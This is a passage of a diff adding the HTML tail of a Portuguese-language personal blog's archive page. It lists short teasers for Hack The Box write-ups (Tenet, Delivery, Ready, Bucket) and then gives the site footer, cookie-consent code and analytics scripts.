+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/06/htb-scriptkiddie/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/06/htb-scriptkiddie/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/m7oESPT.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/04/htb-bucket/" rel="permalink">Hackthebox write-up: Bucket
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-04-24T09:00:00-03:00">April 24, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          13 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/06/htb-scriptkiddie/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Pesquisar...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Acompanhe no</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/termos-e-privacidade" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Termos de uso e Política Privacidade</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+      
+    
+    
+    <li><a href="https://davicruz.com/en-US">Also available in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Desenvolvido com <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-scriptkiddie');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "Este website utiliza cookies para garantir a você uma melhor experiência";
+    var strDismiss = "Entendi!";
+    var strAllow = "Permitir Cookies";
+    var strDeny = "Não, obrigado!";
+    var strLink = "Saiba Mais";
+    var strHref = "https://davicruz.com/termos-e-privacidade/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
